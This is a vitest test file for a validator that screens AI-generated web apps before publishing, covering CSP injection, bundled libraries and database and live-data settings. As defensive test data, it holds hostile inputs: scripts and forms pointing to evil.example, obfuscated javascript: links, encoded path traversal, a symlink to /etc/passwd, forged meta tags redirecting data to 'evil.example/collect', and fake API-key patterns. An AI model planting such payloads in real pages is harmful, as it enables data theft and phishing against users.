import { mkdir, mkdtemp, rm, symlink, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'
import { afterEach, describe, expect, it } from 'vitest'
import { loadLibs } from '../src/pipeline.js'
import { signJobToken } from '../src/token.js'
import { CSP, LIMITS, ValidationError, validateWorkspace } from '../src/validate.js'

const page = (body: string, head = '') => `<!doctype html><html><head><title>t</title>${head}</head><body>${body}</body></html>`
const opts = { jobId: 'job123', libs: new Map([['qrcode.js', Buffer.from('/* pristine */')]]), badgeUrl: 'https://app-generator.example' }

let dir: string
afterEach(() => rm(dir, { recursive: true, force: true }))

const workspace = async (files: Record<string, string>) => {
  dir = await mkdtemp(join(tmpdir(), 'ag-validate-'))
  for (const [path, content] of Object.entries(files)) {
    await mkdir(dirname(join(dir, path)), { recursive: true })
    await writeFile(join(dir, path), content)
  }
  return dir
}

const problemsOf = async (files: Record<string, string>) => {
  try {
    await validateWorkspace(await workspace(files), opts)
    return []
  } catch (error) {
    if (error instanceof ValidationError) return error.problems
    throw error
  }
}

describe('accepted apps', () => {
  it('publishes a plain app with our CSP, job marker and badge injected', async () => {
    const { files: out, sources } = await validateWorkspace(
      await workspace({
        'index.html': page('<h1>Hi</h1><a href="#top">top</a><img src="data:image/png;base64,AAAA"><script src="js/app.js"></script>', '<link rel="stylesheet" href="style.css">'),
        'style.css': 'body { background: url("data:image/png;base64,AAAA") }',
        'js/app.js': 'document.createElementNS("http://www.w3.org/2000/svg", "svg")',
      }),
      opts,
    )
    const html = out.get('index.html')!.toString()
    expect([...out.keys()].sort()).toEqual(['index.html', 'js/app.js', 'style.css'])
    expect(html).toContain(`<meta http-equiv="Content-Security-Policy" content="${CSP}">`)
    expect(html.indexOf('Content-Security-Policy')).toBeLessThan(html.indexOf('<title>'))
    expect(html).toContain('<meta name="app-generator-job" content="job123">')
    expect(html).toContain('AI-generated demo')

    // What a later change starts from: the agent's text, untouched by anything the checker added.
    expect([...sources.keys()].sort()).toEqual(['index.html', 'js/app.js', 'style.css'])
    expect(sources.get('index.html')).toBe(page('<h1>Hi</h1><a href="#top">top</a><img src="data:image/png;base64,AAAA"><script src="js/app.js"></script>', '<link rel="stylesheet" href="style.css">'))
  })

  it('marks links to the app\'s own files with the job that built them', async () => {
    const body = '<a href="#top">a</a><a href="about.html#team">b</a><a href="">c</a><img src="data:image/png;base64,AAAA"><script src="app.js?keep=1"></script><script src=" js/more.js "></script><script src="lib/qrcode.js"></script>'
    const { files, sources } = await validateWorkspace(
      await workspace({ 'index.html': page(body, '<link rel="stylesheet" href="style.css">'), 'about.html': page('x'), 'style.css': 'p{}', 'app.js': '1', 'js/more.js': '2' }),
      opts,
    )
    const html = files.get('index.html')!.toString()
    for (const kept of ['href="#top"', 'href=""', 'src="data:image/png;base64,AAAA"', 'src="app.js?keep=1"']) expect(html).toContain(kept)
    for (const marked of ['href="style.css?v=job123"', 'href="about.html?v=job123#team"', 'src="js/more.js?v=job123"', 'src="lib/qrcode.js?v=job123"']) expect(html).toContain(marked)
    expect(html).toContain('href="https://app-generator.example"')
    expect(sources.get('index.html')).not.toContain('?v=')

    // The marked page is what gets published; checking it again as a source still works.
    const again = await validateWorkspace(await workspace({ 'index.html': html.replace(/<a href="https:[^>]*>[^<]*<\/a>/, ''), 'about.html': page('x'), 'style.css': 'p{}', 'app.js': '1', 'js/more.js': '2' }), { ...opts, jobId: 'job456' })
    expect(again.files.get('index.html')!.toString()).toContain('href="style.css?v=job123"')
  })

  it('replaces a CSP the agent supplied and drops leading comments', async () => {
    const { files: out } = await validateWorkspace(
      await workspace({ 'index.html': `<!-- x --><!doctype html><html><head><meta http-equiv="Content-Security-Policy" content="default-src *"></head><body></body></html>` }),
      opts,
    )
    const html = out.get('index.html')!.toString()
    expect(html).not.toContain('default-src *')
    expect(html).not.toContain('<!-- x -->')
    expect(html.match(/Content-Security-Policy/g)).toHaveLength(1)
  })

  it('ships bundled libraries from the pristine copy, and only when referenced', async () => {
    const { files: used } = await validateWorkspace(await workspace({ 'index.html': page('<script src="lib/qrcode.js"></script>'), 'lib/qrcode.js': 'tampered()' }), opts)
    expect(used.get('lib/qrcode.js')!.toString()).toBe('/* pristine */')
    const { files: unused } = await validateWorkspace(await workspace({ 'index.html': page('hi'), 'lib/qrcode.js': 'x' }), opts)
    expect(unused.has('lib/qrcode.js')).toBe(false)
  })

  it('does not count or read the library folder in the workspace', async () => {
    const files: Record<string, string> = { 'index.html': page('x'), 'lib/chart.js': 'x'.repeat(LIMITS.fileBytes + 1), 'lib/odd name!.js': 'x', 'lib/deep/er/still/x.js': 'x' }
    for (let i = 1; i < LIMITS.files; i++) files[`f${i}.txt`] = 'x'
    const { files: out } = await validateWorkspace(await workspace(files), opts)
    expect(out.size).toBe(LIMITS.files)
    expect([...out.keys()].some((path) => path.startsWith('lib/'))).toBe(false)
  })

  it('ships the real bundled libraries to an app that uses them', async () => {
    const libsDir = join(import.meta.dirname, '../../sandbox/libs')
    const libs = await loadLibs(libsDir)
    const { files: out } = await validateWorkspace(
      await workspace({
        'index.html': page('<canvas id="chart"></canvas><div id="app"></div><script src="lib/chart.js"></script><script src="lib/preact.js"></script><script src="app.js"></script>'),
        'app.js': 'const { html, render } = htmPreact; render(html`<p>hi</p>`, document.getElementById("app")); new Chart(document.getElementById("chart"), { type: "bar", data: { labels: ["a"], datasets: [{ data: [1] }] } })',
      }),
      { ...opts, libs },
    )
    expect([...out.keys()].sort()).toEqual(['app.js', 'index.html', 'lib/chart.js', 'lib/preact.js'])
    expect(out.get('lib/chart.js')!.toString()).toContain('Chart.js v4.5.1')
    expect(out.get('lib/preact.js')!.toString()).toContain('htmPreact')
  })

  it('ships a library that is a folder whole, and only the folders an app uses', async () => {
    const libs = new Map([
      ['chart.js', Buffer.from('/* chart */')],
      ['fonts/inter/font.css', Buffer.from('@font-face { font-family: Inter; src: url(inter-latin.woff2) }')],
      ['fonts/inter/inter-latin.woff2', Buffer.from([0x77, 0x4f, 0x46, 0x32, 0x00, 0xff])],
      ['fonts/inter/LICENSE.txt', Buffer.from('SIL Open Font License')],
      ['fonts/nunito/font.css', Buffer.from('@font-face { font-family: Nunito; src: url(nunito-latin.woff2) }')],
      ['fonts/nunito/nunito-latin.woff2', Buffer.from([0x77, 0x4f, 0x46, 0x32, 0x01])],
    ])
    const { files: out } = await validateWorkspace(
      await workspace({ 'index.html': page('<h1>Hi</h1><script src="app.js"></script>', '<link rel="stylesheet" href="lib/fonts/inter/font.css"><link rel="stylesheet" href="style.css">'), 'style.css': 'body { font-family: Inter, sans-serif }', 'app.js': 'let n = 0' }),
      { ...opts, libs },
    )
    expect([...out.keys()].sort()).toEqual(['app.js', 'index.html', 'lib/fonts/inter/LICENSE.txt', 'lib/fonts/inter/font.css', 'lib/fonts/inter/inter-latin.woff2', 'style.css'])
    // Bytes, not text: a font is published exactly as it is bundled.
    expect([...out.get('lib/fonts/inter/inter-latin.woff2')!]).toEqual([0x77, 0x4f, 0x46, 0x32, 0x00, 0xff])
    expect(out.get('index.html')!.toString()).toContain('href="lib/fonts/inter/font.css?v=job123"')
  })

  it('lets a stylesheet of the app name a bundled font file itself, and refuses one that is not bundled', async () => {
    const libs = new Map([
      ['fonts/inter/font.css', Buffer.from('@font-face {}')],
      ['fonts/inter/inter-latin.woff2', Buffer.from('font')],
    ])
    const app = (source: string) => workspace({ 'index.html': page('<h1>Hi</h1>', '<link rel="stylesheet" href="style.css">'), 'style.css': `@font-face { font-family: Mine; src: url(${source}) }` })
    const { files: out } = await validateWorkspace(await app('lib/fonts/inter/inter-latin.woff2'), { ...opts, libs })
    expect([...out.keys()].sort()).toEqual(['index.html', 'lib/fonts/inter/font.css', 'lib/fonts/inter/inter-latin.woff2', 'style.css'])
    await expect(validateWorkspace(await app('lib/fonts/comic/comic.woff2'), { ...opts, libs })).rejects.toThrow('url() must point to a file inside the app')
  })
})

describe('rejected apps', () => {
  const cases: [string, Record<string, string>, RegExp][] = [
    ['missing index.html', { 'main.html': page('x') }, /index\.html is missing/],
    ['inline script', { 'index.html': page('<script>alert(1)</script>') }, /inline <script>/],
    ['inline event handler', { 'index.html': page('<button onclick="go()">x</button>') }, /inline event handler/],
    ['external script', { 'index.html': page('<script src="https://evil.example/x.js"></script>') }, /external or absolute URL/],
    ['protocol-relative script', { 'index.html': page('<script src="//evil.example/x.js"></script>') }, /external or absolute URL/],
    ['backslash URL', { 'index.html': page('<script src="\\\\evil.example/x.js"></script>') }, /external or absolute URL/],
    ['script that is not .js', { 'index.html': page('<script src="notes.txt"></script>'), 'notes.txt': 'x' }, /must load a \.js file/],
    ['external link', { 'index.html': page('<a href="https://evil.example">x</a>') }, /external or absolute URL/],
    ['javascript: link', { 'index.html': page('<a href="javascript:alert(1)">x</a>') }, /external or absolute URL/],
    ['obfuscated javascript: link', { 'index.html': page('<a href="java&#9;script:alert(1)">x</a>') }, /external or absolute URL/],
    ['link out of the app folder', { 'index.html': page('<a href="../other/">x</a>') }, /external or absolute URL/],
    ['encoded traversal', { 'index.html': page('<a href="%2e%2e/other/">x</a>') }, /external or absolute URL/],
    ['root-relative link', { 'index.html': page('<a href="/lukasb3/">x</a>') }, /external or absolute URL/],
    ['reference to a missing file', { 'index.html': page('<script src="nope.js"></script>') }, /missing file/],
    ['agent-written lib file', { 'index.html': page('<script src="lib/evil.js"></script>'), 'lib/evil.js': 'x' }, /missing file/],
    ['form posting somewhere', { 'index.html': page('<form action="https://evil.example"><input name="a"></form>') }, /forms must not submit/],
    ['formaction', { 'index.html': page('<form><button formaction="x.html">x</button></form>') }, /forms must not submit/],
    ['password field', { 'index.html': page('<input type="PASSWORD">') }, /password fields/],
    ['card data field', { 'index.html': page('<input autocomplete="cc-number">') }, /credentials or card data/],
    ['iframe', { 'index.html': page('<iframe src="index.html"></iframe>') }, /<iframe> is not allowed/],
    ['base tag', { 'index.html': page('', '<base href="https://evil.example/">') }, /<base> is not allowed/],
    ['meta refresh', { 'index.html': page('', '<meta http-equiv="refresh" content="0;url=https://evil.example">') }, /meta refresh/],
    ['preconnect hint', { 'index.html': page('', '<link rel="preconnect" href="https://evil.example">') }, /is not allowed/],
    ['svg script', { 'index.html': page('<svg><script href="x.js"></script></svg>') }, /inline <script>/],
    ['svg external use', { 'index.html': page('<svg><use xlink:href="https://evil.example/a.svg#x"></use></svg>') }, /external or absolute URL/],
    ['style attribute loading a URL', { 'index.html': page('<p style="background:url(https://evil.example/t.gif)">x</p>') }, /style attributes/],
    ['css import', { 'index.html': page('x'), 'a.css': '@import "https://evil.example/x.css";' }, /@import/],
    ['css external url', { 'index.html': page('x'), 'a.css': 'p { background: url(https://evil.example/t.gif) }' }, /url\(\) must point/],
    ['external css in style tag', { 'index.html': page('', '<style>p{background:url(//evil.example/t.gif)}</style>') }, /url\(\) must point/],
    // The policy of a published page allows fonts from its own folder only, so one packed into the CSS would never load.
    ['a font packed into the css', { 'index.html': page('x'), 'a.css': '@font-face { font-family: f; src: url(data:font/woff2;base64,AAAA) }' }, /url\(\) must point/],
    ['external URL in script', { 'index.html': page('x'), 'a.js': 'location.href = "https://evil.example/login"' }, /external URLs are not allowed in scripts/],
    ['websocket URL in script', { 'index.html': page('x'), 'a.js': 'new WebSocket("wss://evil.example")' }, /external URLs/],
    ['service worker', { 'index.html': page('x'), 'a.js': 'navigator.serviceWorker.register("a.js")' }, /workers/],
    ['disallowed file type', { 'index.html': page('x'), 'run.sh': 'echo' }, /file type not allowed/],
    ['svg file', { 'index.html': page('x'), 'a.svg': '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>' }, /file type not allowed/],
    ['dotfile', { 'index.html': page('x'), '.htaccess': 'x' }, /file name not allowed/],
    ['odd file name', { 'index.html': page('x'), 'a b<x>.js': 'x' }, /file name not allowed: \(unnamed file\)/],
    ['binary content', { 'index.html': page('x'), 'a.js': '\u0000\u0001' }, /plain UTF-8/],
    ['invalid JSON', { 'index.html': page('x'), 'a.json': '{' }, /not valid JSON/],
    ['Anthropic key', { 'index.html': page('x'), 'a.js': `const k = "sk-ant-api03-${'a'.repeat(40)}"` }, /Anthropic API key/],
    ['GitHub token', { 'index.html': page(`ghp_${'a'.repeat(36)}`) }, /GitHub token/],
    ['private key', { 'index.html': page('x'), 'a.txt': '-----BEGIN OPENSSH PRIVATE KEY-----' }, /private key/],
    ['sandbox credential', { 'index.html': page('x'), 'a.txt': signJobToken('s'.repeat(32), 'job123', 2_000_000_000) }, /sandbox credential/],
    ['oversized file', { 'index.html': page('x'), 'a.js': 'x'.repeat(LIMITS.fileBytes + 1) }, /larger than/],
    ['deep nesting', { 'index.html': page('x'), 'a/b/c/d.js': 'x' }, /nested too deeply/],
  ]
  it.each(cases)('%s', async (_name, files, expected) => {
    expect((await problemsOf(files)).join('\n')).toMatch(expected)
  })

  it('symlinks', async () => {
    await workspace({ 'index.html': page('x') })
    await symlink('/etc/passwd', join(dir, 'passwd.txt'))
    await expect(validateWorkspace(dir, opts)).rejects.toThrow(/only regular files/)
  })

  it('too many files', async () => {
    const files: Record<string, string> = { 'index.html': page('x') }
    for (let i = 0; i <= LIMITS.files; i++) files[`f${i}.txt`] = 'x'
    expect((await problemsOf(files)).join()).toMatch(/too many files/)
  })

  it('server secrets passed in by the orchestrator', async () => {
    await workspace({ 'index.html': page('the-real-secret-value') })
    await expect(validateWorkspace(dir, { ...opts, extraSecrets: ['the-real-secret-value'] })).rejects.toThrow(/server secret/)
  })
})

describe('apps with tables', () => {
  const database = { url: 'https://project.example', key: 'public-key', prefix: 'ajob123_' }
  const withDb = { ...opts, libs: new Map([...opts.libs, ['db.js', Buffer.from('/* pristine db */')]]), database }
  const app = { 'index.html': page('<ul id="list"></ul><script src="lib/db.js"></script><script src="app.js"></script>'), 'app.js': 'db.table("entries").subscribe((rows) => { document.getElementById("list").textContent = rows.length })' }
  const problemsWith = async (files: Record<string, string>, options: typeof opts & { database?: typeof database } = withDb) => {
    try {
      await validateWorkspace(await workspace(files), options)
      return []
    } catch (error) {
      if (error instanceof ValidationError) return error.problems
      throw error
    }
  }

  it('tells a page that loads the database library where its tables are, and lets it reach them and nothing else', async () => {
    const { files } = await validateWorkspace(await workspace(app), withDb)
    const html = files.get('index.html')!.toString()
    const policy = /<meta http-equiv="Content-Security-Policy" content="([^"]+)">/.exec(html)![1]!
    expect(policy).toBe(CSP.replace("connect-src 'none'", 'connect-src https://project.example/rest/v1/'))
    expect(policy).toContain("script-src 'self'")
    expect(policy).toContain("form-action 'none'")
    expect(html).toContain('<meta name="app-generator-db" content="{&quot;url&quot;:&quot;https://project.example&quot;,&quot;key&quot;:&quot;public-key&quot;,&quot;prefix&quot;:&quot;ajob123_&quot;}">')
    expect(html.indexOf('Content-Security-Policy')).toBeLessThan(html.indexOf('app-generator-db'))
    expect(html).toContain('AI-generated demo from App Generator. Anything entered here is public.')
    expect(files.get('lib/db.js')!.toString()).toBe('/* pristine db */')
  })

  it('keeps every other page closed, also in an app that has tables', async () => {
    const { files } = await validateWorkspace(await workspace({ ...app, 'about.html': page('<p>About</p>') }), withDb)
    const about = files.get('about.html')!.toString()
    expect(about).toContain(`content="${CSP}"`)
    expect(about).not.toContain('app-generator-db')
    expect(about).not.toContain('is public')
    // And an app without tables is published exactly as before.
    const plain = await validateWorkspace(await workspace({ 'index.html': page('<p>Hi</p>') }), opts)
    expect(plain.files.get('index.html')!.toString()).toContain(`content="${CSP}"`)
  })

  it('finds the library from a page in a folder', async () => {
    const { files } = await validateWorkspace(await workspace({ ...app, 'admin/index.html': page('<script src="../lib/db.js"></script>') }), withDb)
    expect(files.get('admin/index.html')!.toString()).toContain('app-generator-db')
  })

  it('drops settings the agent wrote in our name', async () => {
    const forged = '<meta name="app-generator-db" content="{&quot;url&quot;:&quot;https://evil.example&quot;,&quot;key&quot;:&quot;k&quot;,&quot;prefix&quot;:&quot;aother_&quot;}"><meta name="App-Generator-Job" content="forged">'
    const { files } = await validateWorkspace(await workspace({ ...app, 'index.html': page('<script src="lib/db.js"></script><script src="app.js"></script>', forged) }), withDb)
    const html = files.get('index.html')!.toString()
    expect(html).not.toContain('evil.example')
    expect(html).not.toContain('forged')
    expect(html.match(/app-generator-db/g)).toHaveLength(1)
    // Also where the checker adds none of its own.
    const plain = await validateWorkspace(await workspace({ 'index.html': page('<p>Hi</p>', forged) }), opts)
    expect(plain.files.get('index.html')!.toString()).not.toContain('app-generator-db')
  })

  it('rejects a page that loads the library when the app has no table', async () => {
    const problems = await problemsWith(app, { ...withDb, database: undefined })
    expect(problems).toHaveLength(1)
    expect(problems[0]).toMatch(/^index\.html: loads lib\/db\.js, but the app has no table\. Ask for one with the create_table tool\./)
  })

  it.each([
    ['innerHTML', 'list.innerHTML = rows.map((row) => `<li>${row.text}</li>`).join("")'],
    ['outerHTML', 'item.outerHTML = row.text'],
    ['insertAdjacentHTML', 'list.insertAdjacentHTML("beforeend", row.text)'],
    ['document.write', 'document . write(row.text)'],
    ['dangerouslySetInnerHTML', 'html`<p dangerouslySetInnerHTML=${{ __html: row.text }} />`'],
  ])('rejects %s in an app with tables, and only there', async (_name, code) => {
    expect(await problemsWith({ ...app, 'app.js': code })).toEqual([expect.stringMatching(/^app\.js: innerHTML, outerHTML, insertAdjacentHTML and document\.write are not allowed in an app with a database/)])
    expect(await problemsWith({ 'index.html': page('<script src="app.js"></script>'), 'app.js': code }, opts)).toEqual([])
  })

  it('rejects a database token in a file, as it does the token for the model', async () => {
    const token = `agd1.${'a'.repeat(20)}.${'b'.repeat(20)}.1900000000.${'0'.repeat(64)}`
    expect(await problemsWith({ ...app, 'notes.txt': `found ${token}` })).toEqual(['notes.txt: contains what looks like a sandbox credential'])
  })
})

describe('apps with live data', () => {
  const liveData = 'https://api.example/api/data/'
  const libs = new Map([...opts.libs, ['db.js', Buffer.from('/* pristine db */')], ['data.js', Buffer.from('/* pristine data */')]])
  const withData = { ...opts, libs, liveData }
  const app = { 'index.html': page('<p id="now"></p><script src="lib/data.js"></script><script src="app.js"></script>'), 'app.js': 'data.rates("EUR").then((latest) => { document.getElementById("now").textContent = latest.rates.USD })' }

  it('points a page that loads the data library at the live data routes, lets it reach them and nothing else, and names the sources', async () => {
    const { files } = await validateWorkspace(await workspace({ ...app, 'about.html': page('<p>About</p>') }), withData)
    const html = files.get('index.html')!.toString()
    expect(html).toContain(`content="${CSP.replace("connect-src 'none'", 'connect-src https://api.example/api/data/')}"`)
    expect(html).toContain('<meta name="app-generator-data" content="https://api.example/api/data/">')
    expect(html).toContain('AI-generated demo from App Generator. Live data: Open-Meteo.com, ECB via Frankfurter.')
    expect(html).not.toContain('app-generator-db')
    expect(files.get('lib/data.js')!.toString()).toBe('/* pristine data */')
    const about = files.get('about.html')!.toString()
    expect(about).toContain(`content="${CSP}"`)
    expect(about).not.toContain('app-generator-data')
    expect(about).toContain('>AI-generated demo from App Generator<')
  })

  it('opens both ways, and only those, for a page that shares data and shows live data', async () => {
    const database = { url: 'https://project.example', key: 'public-key', prefix: 'ajob123_' }
    const both = page('<script src="lib/db.js"></script><script src="lib/data.js"></script><script src="app.js"></script>')
    const { files } = await validateWorkspace(await workspace({ ...app, 'index.html': both }), { ...withData, database })
    const html = files.get('index.html')!.toString()
    expect(html).toContain('connect-src https://project.example/rest/v1/ https://api.example/api/data/;')
    expect(html).toContain('AI-generated demo from App Generator. Anything entered here is public. Live data: Open-Meteo.com, ECB via Frankfurter.')
    expect(html.match(/<meta name="app-generator-(db|data)"/g)).toHaveLength(2)
  })

  it('drops an address the agent wrote in our name', async () => {
    const forged = '<meta name="app-generator-data" content="https://evil.example/collect/">'
    const { files } = await validateWorkspace(await workspace({ ...app, 'index.html': page('<script src="lib/data.js"></script><script src="app.js"></script>', forged) }), withData)
    const html = files.get('index.html')!.toString()
    expect(html).not.toContain('evil.example')
    expect(html.match(/app-generator-data/g)).toHaveLength(1)
  })

  it('rejects a page that loads the library where there is no live data', async () => {
    try {
      await validateWorkspace(await workspace(app), { ...opts, libs })
      expect.unreachable('should have been rejected')
    } catch (error) {
      expect((error as ValidationError).problems).toEqual(['index.html: loads lib/data.js, but live data is not available here. Build the app without it and do not load lib/data.js'])
    }
  })
})
